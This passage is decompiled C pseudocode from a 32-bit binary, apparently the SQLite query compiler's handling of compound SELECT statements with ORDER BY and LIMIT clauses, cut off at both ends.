  sub_1007BF77(a1, *(int **)v2, v5 + 3, (char ***)v5 + 4);
  sub_1007C129((_DWORD *)v2, v6[3], a1, v6[4]);
  v6[2] = -1;
  if ( *(_BYTE *)(v3 + 30) )
  {
    sub_1006A1BB((unsigned int)v6);
    return 0;
  }
  return v6;
}

//----- (1007C271) --------------------------------------------------------
_DWORD *__usercall sub_1007C271@<eax>(int *a1@<edi>)
{
  _DWORD *result; // eax

  result = (_DWORD *)a1[3];
  if ( !result )
  {
    result = sub_1005AA80(*a1);
    a1[3] = (int)result;
  }
  return result;
}

//----- (1007C285) --------------------------------------------------------
_DWORD *__usercall sub_1007C285@<eax>(_DWORD *result@<eax>, int *a2@<ecx>, int a3)
{
  _DWORD *v3; // ebx
  int v5; // esi
  int v6; // esi
  int v7; // edi
  int v8; // ebx
  int v9; // esi
  int v10; // [esp-1Ch] [ebp-38h]
  int v11; // [esp+10h] [ebp-Ch] BYREF
  int v12; // [esp+14h] [ebp-8h]
  _DWORD *v13; // [esp+18h] [ebp-4h]

  v3 = result;
  if ( !result[12] )
  {
    result = (_DWORD *)sub_100773BA((int)a2);
    if ( v3[10] )
    {
      v5 = ++a2[18];
      v12 = v5;
      v3[12] = v5;
      result = sub_1007C271(a2);
      v13 = result;
      if ( result )
      {
        if ( sub_1007687B(v3[10], &v11) )
        {
          result = (_DWORD *)sub_1005ABE8((int)v13, 7, v11, v5);
          if ( !v11 )
            result = (_DWORD *)sub_1005ABE8((int)v13, 1, 0, a3);
        }
        else
        {
          sub_10077F49(a2, v5, (unsigned __int8 *)v3[10]);
          sub_1005ABD1((int)v13, 21, v5);
          result = (_DWORD *)sub_1005ABE8((int)v13, 114, v5, a3);
        }
        if ( v3[11] )
        {
          v6 = ++a2[18];
          v3[13] = v6;
          ++a2[18];
          sub_10077F49(a2, v6, (unsigned __int8 *)v3[11]);
          v7 = (int)v13;
          sub_1005ABD1((int)v13, 21, v6);
          v8 = sub_1005ABD1(v7, 112, v6);
          sub_1005ABE8(v7, 7, 0, v6);
          sub_1005AE20(v8, v7);
          sub_1005AB66(v7, 86, v12, v6, v6 + 1);
          v10 = v6 + 1;
          v9 = sub_1005ABD1(v7, 112, v12);
          sub_1005ABE8(v7, 7, -1, v10);
          return (_DWORD *)sub_1005AE20(v9, v7);
        }
      }
    }
  }
  return result;
}

//----- (1007C3B3) --------------------------------------------------------
int *__cdecl sub_1007C3B3(int *a1, _DWORD *a2, int a3)
{
  int v3; // eax
  int *result; // eax

  v3 = a2[7];
  if ( v3 )
    result = (int *)sub_1007C3B3(a1, v3, a3);
  else
    result = 0;
  if ( !result && a3 < *(_DWORD *)*a2 )
    return sub_1007596F(*(unsigned __int8 **)(*(_DWORD *)(*a2 + 12) + 20 * a3), a1);
  return result;
}

//----- (1007C3F7) --------------------------------------------------------
int __usercall sub_1007C3F7@<eax>(int **a1@<eax>, int *a2, int a3)
{
  int v4; // eax
  int v5; // eax
  bool v6; // zf
  int *v7; // ecx
  int *v8; // ecx
  _DWORD *v9; // eax
  int *v10; // edi
  int v12; // edi
  int v13; // eax
  int *v14; // ecx
  int **v15; // eax
  int v16; // eax
  int **v17; // eax
  int v18; // eax
  int v19; // ecx
  int *v20; // ecx
  int v21; // eax
  int *v22; // edi
  int *v23; // ecx
  int **v24; // eax
  int v25; // edi
  _DWORD *v26; // eax
  unsigned __int16 *v27; // edi
  bool v28; // cc
  int *v29; // eax
  int **v30; // ecx
  int *v31; // ebx
  int v32; // eax
  int *v33; // ecx
  int v34; // [esp-8h] [ebp-68h]
  int v35; // [esp-8h] [ebp-68h]
  int v36; // [esp-8h] [ebp-68h]
  int v37; // [esp-8h] [ebp-68h]
  char *v38; // [esp-4h] [ebp-64h]
  char *v39; // [esp-4h] [ebp-64h]
  char *v40; // [esp-4h] [ebp-64h]
  unsigned int v41; // [esp-4h] [ebp-64h]
  unsigned int v42; // [esp-4h] [ebp-64h]
  unsigned int v43; // [esp-4h] [ebp-64h]
  char v44[4]; // [esp+10h] [ebp-50h] BYREF
  int v45; // [esp+14h] [ebp-4Ch]
  int v46; // [esp+18h] [ebp-48h]
  int v47; // [esp+1Ch] [ebp-44h]
  char v48[4]; // [esp+20h] [ebp-40h] BYREF
  int v49; // [esp+24h] [ebp-3Ch]
  int v50; // [esp+28h] [ebp-38h]
  int v51; // [esp+2Ch] [ebp-34h]
  int v52; // [esp+30h] [ebp-30h] BYREF
  int v53; // [esp+34h] [ebp-2Ch]
  int v54; // [esp+38h] [ebp-28h]
  int v55; // [esp+3Ch] [ebp-24h]
  int *v56; // [esp+40h] [ebp-20h]
  int **v57; // [esp+44h] [ebp-1Ch]
  int *v58; // [esp+48h] [ebp-18h]
  int v59; // [esp+4Ch] [ebp-14h]
  int v60; // [esp+50h] [ebp-10h]
  int v61; // [esp+54h] [ebp-Ch]
  int v62; // [esp+58h] [ebp-8h]
  int v63; // [esp+5Ch] [ebp-4h]
  int **v64; // [esp+68h] [ebp+8h]

  v52 = *(_DWORD *)a3;
  v53 = *(_DWORD *)(a3 + 4);
  v4 = *a2;
  v54 = *(_DWORD *)(a3 + 8);
  v60 = v4;
  v5 = (int)a1[7];
  v55 = *(_DWORD *)(a3 + 12);
  v6 = *(_DWORD *)(v5 + 24) == 0;
  v58 = 0;
  v59 = v5;
  if ( v6 )
  {
    if ( *(_DWORD *)(v5 + 40) )
    {
      v39 = sub_1007BF54(*((unsigned __int8 *)a1 + 4));
      sub_10059320(v8, aLimitClauseSho, v39);
      goto LABEL_3;
    }
    v9 = sub_1007C271(a2);
    v63 = (int)v9;
    if ( (_BYTE)v52 == 9 )
    {
      sub_1005ABE8((int)v9, 40, v53, **a1);
      LOBYTE(v52) = 8;
    }
    v10 = (int *)v59;
    if ( **a1 != **(_DWORD **)v59 )
    {
      v40 = sub_1007BF54(*((unsigned __int8 *)a1 + 4));
      sub_10059320(a2, aSelectsToTheLe, v40);
      goto LABEL_3;
    }
    if ( a1[6] )
      return sub_1007CC64(a2, a1, (char *)a3);
    if ( *((_BYTE *)a1 + 4) != 112 )
    {
      if ( *((_BYTE *)a1 + 4) == 113 )
      {
        *(_DWORD *)(v59 + 40) = a1[10];
        v10[11] = (int)a1[11];
        v57 = 0;
        v16 = sub_1007E480(a2, v10, &v52);
        v62 = v16;
        a1[10] = 0;
        a1[11] = 0;
        if ( v16 )
          goto LABEL_55;
        a1[7] = 0;
        a1[12] = (int *)v10[12];
        a1[13] = (int *)v10[13];
        if ( a1[12] )
          v57 = (int **)sub_1005ABD1(v63, 114, (int)a1[12]);
        v62 = sub_1007E480(a2, a1, &v52);
        v58 = a1[7];
        v17 = v57;
        v6 = v57 == 0;
        a1[7] = v10;
        if ( !v6 )
          sub_1005AE20((int)v17, v63);
        goto LABEL_40;
      }
      if ( *((_BYTE *)a1 + 4) != 114 )
      {
        v12 = a2[17];
        a2[17] = v12 + 2;
        a1[14] = (int *)sub_1005ABE8(v63, 40, v12, 0);
        *((_WORD *)a1[9] + 3) |= 8u;
        v48[0] = 1;
        v49 = v12;
        v48[1] = 0;
        v50 = 0;
        v51 = 0;
        v62 = sub_1007E480(a2, v59, v48);
        if ( v62 )
          goto LABEL_55;
        a1[15] = (int *)sub_1005ABE8(v63, 40, v12 + 1, 0);
        v57 = (int **)a1[10];
        v61 = (int)a1[11];
        v49 = v12 + 1;
        a1[7] = 0;
        a1[10] = 0;
        a1[11] = 0;
        v13 = sub_1007E480(a2, a1, v48);
        v41 = (unsigned int)a1[10];
        v62 = v13;
        v34 = v60;
        v58 = a1[7];
        a1[7] = (int *)v59;
        sub_10075FD8(v34, v41);
        v6 = (_BYTE)v52 == 5;
        a1[10] = (int *)v57;
        a1[11] = (int *)v61;
        if ( v6 )
        {
          v14 = a1[7];
          v15 = a1;
          while ( v14 )
          {
            v15 = (int **)v14;
            v14 = (int *)v14[7];
          }
          sub_1007BDF4((int)a2, 0, *v15);
        }
        v61 = sub_1005AC63(v63);
        v59 = sub_1005AC63(v63);
        sub_1007C285(a1, a2, v61);
        sub_1005ABE8(v63, 64, v12, v61);
        v57 = (int **)sub_10078A55((int)a2);
        v56 = (int *)sub_1005ABE8(v63, 58, v12, (int)v57);
        sub_1005AC32((int *)v63, 48, v12 + 1, v59, (int)v57, 0);
        sub_10078A70((int)a2, (int)v57);
        sub_1007B5F5((unsigned __int8 *)&v52, a2, (int)a1, (int)*a1, v12, **a1, 0, -1, v59, v61);
        sub_1005ACAF(v63, v59);
        sub_1005ABE8(v63, 66, v12, (int)v56);
        sub_1005ACAF(v63, v61);
        sub_1005ABE8(v63, 42, v12 + 1, 0);
        sub_1005ABE8(v63, 42, v12, 0);
LABEL_40:
        if ( (*((_BYTE *)a1 + 6) & 8) != 0 )
        {
          v59 = **a1;
          v26 = sub_1005904B(v60, 5 * v59 + 16);
          v27 = (unsigned __int16 *)v26;
          if ( v26 )
          {
            *((_BYTE *)v26 + 4) = *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(v60 + 8) + 12) + 73);
            v28 = v59 <= 0;
            *((_WORD *)v26 + 3) = v59;
            v61 = 0;
            v57 = (int **)(v26 + 3);
            if ( !v28 )
            {
              do
              {
                v29 = sub_1007C3B3(a2, a1, v61);
                v30 = v57;
                *v57 = v29;
                if ( !v29 )
                  *v30 = *(int **)(v60 + 44);
                ++v61;
                v57 = v30 + 1;
              }
              while ( v61 < v59 );
            }
            v64 = a1;
            do
            {
              v61 = 0;
              v31 = (int *)(v64 + 14);
              do
              {
                v32 = *v31;
                v56 = (int *)*v31;
                if ( (int)v56 < 0 )
                  break;
                v33 = (int *)v63;
                if ( *(_DWORD *)(v63 + 12) > v32 )
                {
                  *(_DWORD *)(20 * v32 + *(_DWORD *)(v63 + 20) + 8) = v59;
                  v33 = (int *)v63;
                  v32 = (int)v56;
                }
                sub_1005AFA8(v32, v33, v27, (_BYTE *)0xFFFFFFFA);
                *v31 = -1;
                ++v61;
                ++v31;
              }
              while ( v61 < 2 );
              v64 = (int **)v64[7];
            }
            while ( v64 );
            sub_10058EC7(v60, (unsigned int)v27);
          }
          else
          {
            v62 = 7;
          }
        }
        goto LABEL_55;
      }
    }
    if ( (_BYTE)v52 != 1 || a1[10] || a1[11] )
    {
      v61 = a2[17];
      v35 = v61;
      v18 = v63;
      a2[17] = v61 + 1;
      a1[14] = (int *)sub_1005ABE8(v18, 40, v35, 0);
      *((_WORD *)a1[9] + 3) |= 8u;
    }
    else
    {
      v61 = v53;
    }
    v45 = v61;
    v44[0] = 1;
    v44[1] = 0;
    v46 = 0;
    v47 = 0;
    v62 = sub_1007E480(a2, v10, v44);
    if ( v62 )
      goto LABEL_55;
    v19 = (int)a1[10];
    v44[0] = (*((_BYTE *)a1 + 4) == 114) + 1;
    v56 = (int *)v19;
    v20 = a1[11];
    a1[7] = 0;
    a1[10] = 0;
    v57 = (int **)v20;
    a1[11] = 0;
    v21 = sub_1007E480(a2, a1, v44);
    v22 = a1[6];
    v62 = v21;
    sub_100767B1(v22, v60);
    v42 = (unsigned int)a1[10];
    v58 = a1[7];
    v36 = v60;
    a1[7] = (int *)v59;
    a1[6] = 0;
    sub_10075FD8(v36, v42);
    v6 = (_BYTE)v52 == 1;
    a1[10] = v56;
    a1[11] = (int *)v57;
    a1[12] = 0;
    a1[13] = 0;
    if ( !v6 )
    {
      if ( (_BYTE)v52 == 5 )
      {
        v23 = a1[7];
        v24 = a1;
        while ( v23 )
        {
          v24 = (int **)v23;
          v23 = (int *)v23[7];
        }
        sub_1007BDF4((int)a2, 0, *v24);
      }
      v25 = v63;
      v59 = sub_1005AC63(v63);
      v57 = (int **)sub_1005AC63(v25);
      sub_1007C285(a1, a2, v59);
      sub_1005ABE8(v25, 64, v61, v59);
      v56 = *(int **)(v25 + 12);
      sub_1007B5F5((unsigned __int8 *)&v52, a2, (int)a1, (int)*a1, v61, **a1, 0, -1, (int)v57, v59);
      sub_1005ACAF(v25, (int)v57);
      sub_1005ABE8(v25, 66, v61, (int)v56);
      sub_1005ACAF(v25, v59);
      sub_1005ABE8(v25, 42, v61, 0);
    }
    goto LABEL_40;
  }
  v38 = sub_1007BF54(*((unsigned __int8 *)a1 + 4));
  sub_10059320(v7, aOrderByClauseS, v38);
LABEL_3:
  v62 = 1;
LABEL_55:
  v43 = (unsigned int)v58;
  *(_DWORD *)(a3 + 8) = v54;
  v37 = v60;
  *(_DWORD *)(a3 + 12) = v55;
  sub_1007B016(v37, v43);
  return v62;
}
// 1007C435: variable 'v7' is possibly undefined
// 1007C45A: variable 'v8' is possibly undefined
// 1007E480: using guessed type _DWORD __cdecl sub_1007E480(_DWORD, _DWORD, _DWORD);

//----- (1007C9C2) --------------------------------------------------------
int __cdecl sub_1007C9C2(int *a1, int a2, int a3, char *a4, int a5, int a6, unsigned __int16 *a7, _BYTE *a8, int a9)
{
  int *v9; // ebx
  int v10; // esi
  int v11; // eax
  int v12; // eax
  int v13; // edi
  unsigned __int8 v15; // al
  int v16; // eax
  int v17; // eax
  int v18; // edi
  unsigned __int16 *v19; // edx
  int v20; // eax
  int v21; // [esp+10h] [ebp-14h]
  int v22; // [esp+14h] [ebp-10h]
  int v23; // [esp+14h] [ebp-10h]
  int v24; // [esp+18h] [ebp-Ch]
  int v25; // [esp+1Ch] [ebp-8h]
  int v26; // [esp+1Ch] [ebp-8h]
  int v27; // [esp+40h] [ebp+1Ch]

  v9 = (int *)a1[3];
  v21 = v9[3];
  v24 = sub_1005AC63((int)v9);
  if ( a6 )
  {
    v10 = a3;
    v22 = sub_1005ABD1((int)v9, 27, a6);
    v11 = sub_1005AC02(v9, 24, *(_DWORD *)(a3 + 8), a6 + 1, *(_DWORD *)(a3 + 12), a7, a8);
    sub_1005AB66((int)v9, 25, v11 + 2, v24, v11 + 2);
    sub_1005AE20(v22, (int)v9);
    v12 = *(_DWORD *)(a3 + 8);
    if ( v12 != a6 + 1 && *(int *)(a3 + 12) > 0 )
    {
      v25 = *(_DWORD *)(a3 + 8);
      v13 = a6 + 1 - v12;
      v23 = *(_DWORD *)(a3 + 12);
      do
      {
        sub_1005ABE8(a1[3], 14, v25, v13 + v25);
        ++v25;
        --v23;
      }
      while ( v23 );
    }
    sub_1005ABE8((int)v9, 7, 1, a6);
  }
  else
  {
    v10 = a3;
  }
  if ( *(_BYTE *)(*a1 + 30) )
    return 0;
  sub_1007B530(a2, (int)v9, v24);
  v15 = *a4;
  if ( *a4 == 6 )
  {
    sub_100773D8((int)a1, 1, *(_DWORD *)(v10 + 8), *((_DWORD *)a4 + 1));
    goto LABEL_22;
  }
  if ( v15 == 7 )
  {
    *(_BYTE *)(a2 + 5) = sub_10075A35(**(unsigned __int8 ***)(*(_DWORD *)a2 + 12), a4[1]);
    v18 = sub_10078A55((int)a1);
    sub_1005AC02(v9, 30, *(_DWORD *)(v10 + 8), 1, v18, v19, (_BYTE *)1);
    sub_100772A8((int)a1, 1, *(_DWORD *)(v10 + 8));
    sub_1005ABE8((int)v9, 67, *((_DWORD *)a4 + 1), v18);
    sub_10078A70((int)a1, v18);
    goto LABEL_22;
  }
  if ( v15 <= 7u )
    goto LABEL_19;
  if ( v15 > 9u )
  {
    if ( v15 == 10 )
    {
      if ( !*((_DWORD *)a4 + 2) )
      {
        v16 = sub_10078AA4(a1, *(_DWORD *)(v10 + 12));
        v10 = a3;
        *((_DWORD *)a4 + 2) = v16;
        *((_DWORD *)a4 + 3) = *(_DWORD *)(a3 + 12);
      }
      sub_100773D8((int)a1, *((_DWORD *)a4 + 3), *(_DWORD *)(v10 + 8), *((_DWORD *)a4 + 2));
      sub_1005ABD1((int)v9, 4, *((_DWORD *)a4 + 1));
      goto LABEL_22;
    }
LABEL_19:
    sub_1005ABE8((int)v9, 16, *(_DWORD *)(v10 + 8), *(_DWORD *)(v10 + 12));
    sub_100772A8((int)a1, *(_DWORD *)(v10 + 12), *(_DWORD *)(v10 + 8));
    goto LABEL_22;
  }
  v26 = sub_10078A55((int)a1);
  v27 = sub_10078A55((int)a1);
  sub_1005AB66((int)v9, 30, *(_DWORD *)(v10 + 8), *(_DWORD *)(v10 + 12), v26);
  sub_1005ABE8((int)v9, 53, *((_DWORD *)a4 + 1), v27);
  sub_1005AB66((int)v9, 54, *((_DWORD *)a4 + 1), v26, v27);
  sub_1005AE0E((int)v9, 8);
  v17 = sub_10078A70((int)a1, v27);
  sub_10078A70(v17, v26);
LABEL_22:
  v20 = *(_DWORD *)(a2 + 48);
  if ( v20 )
    sub_1005AB66((int)v9, 114, v20, a9, -1);
  sub_1005ACAF((int)v9, v24);
  sub_1005ABD1((int)v9, 3, a5);
  return v21;
}
// 1007CBDD: variable 'v19' is possibly undefined

//----- (1007CC64) --------------------------------------------------------
int __cdecl sub_1007CC64(int *a1, int **a2, char *a3)
{
  int v3; // esi
  int v4; // edi
  int v5; // eax
  int **v6; // edi
  int **v7; // ecx
  int *v8; // ebx
  int v9; // eax
  int v10; // ecx
  bool v11; // zf
  unsigned __int16 *v12; // eax
  _DWORD *v13; // eax
  int v14; // esi
  int *v15; // ecx
  int *v16; // eax
  int v17; // ecx
  unsigned __int16 *v18; // eax
  int v19; // ecx
  int v20; // edx
  unsigned __int16 *v21; // eax
  unsigned __int16 *v22; // ecx
  int v23; // edx
  int v24; // eax
  int v25; // esi
  int *v26; // eax
  int **v28; // edx
  int v29; // esi
  int v30; // edx
  int v31; // eax
  int *v32; // eax
  int *v33; // esi
  int v34; // ebx
  _DWORD *v35; // eax
  int v36; // ecx
  int *v37; // eax
  int *v38; // ecx
  int v39; // ecx
  int v40; // eax
  bool v41; // cc
  int **v42; // eax
  int *v43; // edx
  int v44; // eax
  int *v45; // eax
  int v46; // eax
  int v47; // eax
  int v48; // eax
  int **v49; // eax
  int v50; // eax
  int **v51; // esi
  int *v52; // ecx
  int **v53; // eax
  unsigned int v54; // [esp-Ch] [ebp-A0h]
  int v55; // [esp-4h] [ebp-98h]
  char v56[4]; // [esp+10h] [ebp-84h] BYREF
  int v57; // [esp+14h] [ebp-80h]
  int v58; // [esp+18h] [ebp-7Ch]
  int v59; // [esp+1Ch] [ebp-78h]
  char v60[4]; // [esp+20h] [ebp-74h] BYREF
  int v61; // [esp+24h] [ebp-70h]
  int v62; // [esp+28h] [ebp-6Ch]
  int v63; // [esp+2Ch] [ebp-68h]
  int v64; // [esp+30h] [ebp-64h]
  int v65; // [esp+34h] [ebp-60h]
  int v66; // [esp+38h] [ebp-5Ch]
  int v67; // [esp+3Ch] [ebp-58h]
  unsigned __int16 *v68; // [esp+40h] [ebp-54h]
  int *v69; // [esp+44h] [ebp-50h]
  unsigned __int16 *v70; // [esp+48h] [ebp-4Ch]
  unsigned __int16 *v71; // [esp+4Ch] [ebp-48h]
  int v72; // [esp+50h] [ebp-44h]
  int v73; // [esp+54h] [ebp-40h]
  int v74; // [esp+58h] [ebp-3Ch]
  int v75; // [esp+5Ch] [ebp-38h]
  int *v76; // [esp+60h] [ebp-34h]
  int *v77; // [esp+64h] [ebp-30h]
  int v78; // [esp+68h] [ebp-2Ch]
  int v79; // [esp+6Ch] [ebp-28h]
  int **v80; // [esp+70h] [ebp-24h]
  unsigned __int16 *v81; // [esp+74h] [ebp-20h]
  int v82; // [esp+78h] [ebp-1Ch]
  int v83; // [esp+7Ch] [ebp-18h]
  int v84; // [esp+80h] [ebp-14h]
  int v85; // [esp+84h] [ebp-10h]
  int v86; // [esp+88h] [ebp-Ch]
  char v87; // [esp+8Fh] [ebp-5h]

  v73 = 0;
  v81 = 0;
  v3 = *a1;
  v4 = a1[3];
  v79 = *a1;
  v69 = (int *)v4;
  v82 = sub_1005AC63(v4);
  v5 = sub_1005AC63(v4);
  v6 = a2;
  v7 = (int **)a2[7];
  v8 = a2[6];
  v75 = v5;
  v9 = *((unsigned __int8 *)a2 + 4);
  v80 = v7;
  v10 = *v8;
  v85 = v9;
  v76 = v8;
  v84 = v10;
  if ( v9 != 113 )
  {
    v11 = *(_BYTE *)(v3 + 30) == 0;
    v86 = 1;
    if ( v11 )
    {
      v74 = 20 * v10;
      while ( v86 <= **a2 )
      {
        v77 = 0;
        if ( v10 > 0 )
        {
          v12 = (unsigned __int16 *)(v8[3] + 14);
          do
          {
            if ( *v12 == v86 )
              break;
            v77 = (int *)((char *)v77 + 1);
            v12 += 10;
          }
          while ( (int)v77 < v10 );
        }
        if ( v77 == (int *)v10 )
        {
          v13 = sub_10075D3B(v3, 129);
          if ( !v13 )
            return 7;
          v14 = v86;
          *((_WORD *)v13 + 1) |= 0x400u;
          v15 = v76;
          v13[1] = v14;
          v16 = sub_100766CA(a1, v15, (unsigned int)v13);
          v17 = v74;
          ++v84;
          v74 += 20;
          v76 = v16;
          v8 = v16;
          *(_WORD *)(v16[3] + v17 + 14) = v14;
          v3 = v79;
          v10 = v84;
        }
        ++v86;
        if ( *(_BYTE *)(v3 + 30) )
          break;
      }
    }
  }
  v18 = (unsigned __int16 *)sub_10059073(v3, 4 * v10);
  v19 = 0;
  v68 = v18;
  if ( v18 )
  {
    if ( v84 > 0 )
    {
      v74 = v8[3] + 14;
      do
      {
        v20 = *(unsigned __int16 *)v74;
        v74 += 20;
        *(_DWORD *)&v18[2 * v19++] = v20 - 1;
      }
      while ( v19 < v84 );
    }
    v21 = (unsigned __int16 *)sub_10059073(v3, 5 * v84 + 16);
    v22 = v21;
    v71 = v21;
    if ( v21 )
    {
      v23 = v84;
      *((_DWORD *)v21 + 2) = &v21[2 * v84 + 6];
      v21[3] = v23;
      *((_BYTE *)v21 + 4) = *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(v3 + 8) + 12) + 73);
      v24 = 0;
      v86 = 0;
      if ( v23 > 0 )
      {
        v77 = 0;
        v74 = (int)(v22 + 6);
        do
        {
          v25 = *(int *)((char *)v77 + v8[3]);
          if ( (*(_WORD *)(v25 + 2) & 0x100) != 0 )
          {
            v26 = *(int **)(v25 + 20);
          }
          else
          {
            v26 = sub_1007C3B3(a1, a2, *(_DWORD *)&v68[2 * v24]);
            v22 = v71;
            *(_WORD *)(v25 + 2) |= 0x100u;
            *(_DWORD *)(v25 + 20) = v26;
          }
          v28 = (int **)v74;
          v29 = (int)v77;
          v74 += 4;
          v77 += 5;
          *v28 = v26;
          v30 = *((_DWORD *)v22 + 2);
          v87 = *(_BYTE *)(v8[3] + v29 + 12);
          v31 = v86;
          v70 = v22;
          *(_BYTE *)(v86 + v30) = v87;
          v22 = v70;
          v24 = v31 + 1;
          v86 = v24;
        }
        while ( v24 < v84 );
      }
    }
  }
  else
  {
    v71 = 0;
  }
  a2[6] = v8;
  v32 = (int *)sub_10076339(v8, *a1, 0);
  v11 = v85 == 113;
  v80[6] = v32;
  if ( v11 )
  {
    v33 = v69;
    v74 = 0;
  }
  else
  {
    v34 = **a2;
    v33 = v69;
    v74 = sub_10078AA4(a1, v34 + 1);
    sub_1005ABE8((int)v69, 7, 0, v74);
    v35 = sub_1005904B(v79, 5 * v34 + 16);
    v81 = (unsigned __int16 *)v35;
    if ( v35 )
    {
      v86 = 0;
      v35[2] = &v35[v34 + 3];
      v36 = v79;
      *((_WORD *)v35 + 3) = v34;
      *((_BYTE *)v35 + 4) = *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(v36 + 8) + 12) + 73);
      if ( v34 > 0 )
      {
        v76 = v35 + 3;
        do
        {
          v37 = sub_1007C3B3(a1, a2, v86);
          v38 = v76++;
          *v38 = (int)v37;
          v39 = v86;
          v40 = *((_DWORD *)v81 + 2);
          v41 = ++v86 < v34;
          *(_BYTE *)(v39 + v40) = 0;
        }
        while ( v41 );
      }
    }
  }
  v42 = v80;
  a2[7] = 0;
  v42[9] = 0;
  sub_1007FC16(a2[6], a1, a2, aOrder);
  if ( !v80[7] )
    sub_1007FC16(v80[6], a1, v80, aOrder_0);
  sub_1007C285(a2, a1, v82);
  if ( a2[12] && v85 == 113 )
  {
    v43 = (int *)(a1[18] + 1);
    v44 = a1[18] + 2;
    a1[18] = v44;
    v77 = (int *)v44;
    v45 = a2[13];
    v76 = v43;
    if ( v45 )
      v46 = (int)v45 + 1;
    else
      v46 = (int)a2[12];
    sub_1005ABE8((int)v33, 14, v46, (int)v43);
    sub_1005ABE8((int)v33, 14, (int)v76, (int)v77);
  }
  else
  {
    v77 = 0;
    v76 = 0;
  }
  sub_10075FD8(v79, (unsigned int)a2[10]);
  v54 = (unsigned int)a2[11];
  a2[10] = 0;
  sub_10075FD8(v79, v54);
  a2[11] = 0;
  v47 = a1[18] + 1;
  v86 = a1[18] + 2;
  v70 = (unsigned __int16 *)(v86 + 1);
  v83 = v86 + 2;
  v78 = v47;
  v57 = v47;
  v48 = v86 + 1;
  v72 = v86 + 4;
  a1[18] = v86 + 4;
  strcpy(v56, "\n");
  v58 = 0;
  v59 = 0;
  strcpy(v60, "\n");
  v61 = v48;
  v62 = 0;
  v63 = 0;
  v67 = sub_1005ABB9((int)v33, 1);
  v66 = v33[3];
  v49 = v80;
  v80[12] = v76;
  sub_1007E480(a1, v49, v56);
  sub_1005ABE8((int)v33, 7, 1, v86);
  sub_1005ABD1((int)v33, 4, v78);
  v65 = v33[3];
  v70 = (unsigned __int16 *)a2[12];
  v76 = a2[13];
  a2[12] = v77;
  a2[13] = 0;
  sub_1007E480(a1, a2, v60);
  v55 = v83;
  a2[12] = (int *)v70;
  a2[13] = v76;
  sub_1005ABE8((int)v33, 7, 1, v55);
  sub_1005ABD1((int)v33, 4, v86 + 1);
  v70 = (unsigned __int16 *)sub_1007C9C2(a1, (int)a2, (int)v56, a3, v83 + 1, v74, v81, (_BYTE *)0xFFFFFFF0, v82);
  if ( v85 == 113 || v85 == 112 )
    v73 = sub_1007C9C2(a1, (int)a2, (int)v60, a3, v72, v74, v81, (_BYTE *)0xFFFFFFEF, v82);
  if ( v85 == 114 || v85 == 115 )
  {
    v81 = (unsigned __int16 *)sub_1005ABE8((int)v33, 1, 0, v82);
  }
  else
  {
    v81 = (unsigned __int16 *)sub_1005ABE8((int)v33, 26, v83, v82);
    sub_1005ABE8((int)v33, 2, v72, v73);
    sub_1005ABD1((int)v33, 4, v86 + 1);
    sub_1005ABE8((int)v33, 1, 0, (int)v81);
  }
  if ( v85 == 115 )
  {
    v76 = (int *)v81;
  }
  else
  {
    v76 = (int *)sub_1005ABE8((int)v33, 26, v86, v82);
    sub_1005ABE8((int)v33, 2, v83 + 1, (int)v70);
    sub_1005ABD1((int)v33, 4, v78);
    sub_1005ABE8((int)v33, 1, 0, (int)v76);
  }
  v77 = (int *)sub_1005ABE8((int)v33, 2, v83 + 1, (int)v70);
  sub_1005ABD1((int)v33, 4, v78);
  sub_1005ABE8((int)v33, 26, v86, (int)v81);
  sub_1005ABE8((int)v33, 1, 0, v75);
  if ( v85 == 113 )
  {
    v70 = (unsigned __int16 *)v77;
  }
  else if ( v85 == 115 )
  {
    v50 = (int)v77;
    v77 = (int *)((char *)v77 + 1);
    v70 = (unsigned __int16 *)v50;
  }
  else
  {
    v70 = (unsigned __int16 *)sub_1005ABD1((int)v33, 4, v78);
    sub_1005ABE8((int)v33, 26, v86, (int)v81);
    sub_1005ABE8((int)v33, 1, 0, v75);
  }
  v64 = v33[3];
  if ( v85 == 113 || v85 == 112 )
    sub_1005ABE8((int)v33, 2, v72, v73);
  sub_1005ABD1((int)v33, 4, v86 + 1);
  sub_1005ABE8((int)v33, 26, v83, (int)v76);
  sub_1005ABE8((int)v33, 1, 0, v75);
  sub_1005AE20(v67, (int)v33);
  sub_1005ABE8((int)v33, 7, 0, v86);
  sub_1005ABE8((int)v33, 7, 0, v83);
  sub_1005ABE8((int)v33, 2, v78, v66);
  sub_1005ABE8((int)v33, 2, v86 + 1, v65);
  sub_1005ABE8((int)v33, 26, v86, (int)v81);
  sub_1005ABE8((int)v33, 26, v83, (int)v76);
  sub_1005ACAF((int)v33, v75);
  sub_1005AC02(v33, 23, 0, 0, 0, v68, (_BYTE *)0xFFFFFFF1);
  sub_1005AC02(v33, 24, v58, v62, v84, v71, (_BYTE *)0xFFFFFFF0);
  sub_1005AB66((int)v33, 25, (int)v77, (int)v70, v64);
  if ( v74 )
  {
    sub_10078AC8((int)a1, v74, v84 + 1);
    v6 = a2;
    v33 = v69;
  }
  sub_1005ACAF((int)v33, v82);
  v51 = v80;
  if ( *a3 == 5 )
  {
    v52 = v80[7];
    v53 = v80;
    while ( v52 )
    {
      v53 = (int **)v52;
      v52 = (int *)v52[7];
    }
    sub_1007BDF4((int)a1, 0, *v53);
  }
  if ( v6[7] )
    sub_1007B016(v79, (unsigned int)v6[7]);
  v6[7] = (int *)v51;
  return 0;
}
// 1007E480: using guessed type _DWORD __cdecl sub_1007E480(_DWORD, _DWORD, _DWORD);

//----- (1007D3E0) --------------------------------------------------------
_DWORD *__cdecl sub_1007D3E0(int a1, unsigned int a2, int a3, int a4)
{
  unsigned int v4; // esi
  int v5; // ebx
  __int16 v7; // ax
  _DWORD *v8; // edi
  int v9; // eax
  int v10; // eax
  bool v11; // zf
  _DWORD *v12; // edi
  int i; // [esp+Ch] [ebp-4h]

  v4 = a2;
  v5 = 0;
  if ( !a2 )
    return 0;
  if ( *(_BYTE *)a2 == 0x98 && *(_DWORD *)(a2 + 24) == a3 )
  {
    v7 = *(_WORD *)(a2 + 28);
    if ( v7 >= 0 )
    {
      v8 = sub_1007631C(a1, *(void ***)(20 * v7 + *(_DWORD *)(a4 + 12)), 0);
      if ( v8 )
      {
        v9 = *(_DWORD *)(a2 + 20);
        if ( v9 )
          v8[5] = v9;
      }
      sub_10075FD8(a1, a2);
      return v8;
    }
    else
    {
      *(_BYTE *)a2 = 98;
    }
  }
  else
  {
    *(_DWORD *)(a2 + 8) = sub_1007D3E0(a1, *(_DWORD *)(a2 + 8), a3, a4);
